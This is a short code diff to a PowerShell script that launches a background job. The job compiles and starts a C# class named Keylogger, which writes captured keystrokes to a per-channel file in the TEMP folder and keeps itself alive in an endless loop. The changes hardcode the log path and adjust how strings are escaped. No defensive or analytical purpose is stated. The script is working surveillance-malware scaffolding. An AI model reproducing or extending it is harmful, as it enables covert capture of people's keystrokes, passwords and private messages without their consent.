@@ -4,9 +4,8 @@ $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
 
-# PowerShell script to run in background
+# PowerShell script to run in background – note the careful escaping
 $scriptBlock = @"
-param(`$logFile)
 `$cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -89,8 +88,7 @@ public class Keylogger
 }
 "@
 Add-Type -TypeDefinition `$cSharpCode -ReferencedAssemblies "System.Windows.Forms"
-[Keylogger]::Start(`$logFile)
-# Keep the process alive
+[Keylogger]::Start("$env:TEMP\keylog_$env:ChannelID.txt")
 while(`$true) {
     Start-Sleep -Seconds 10
 }
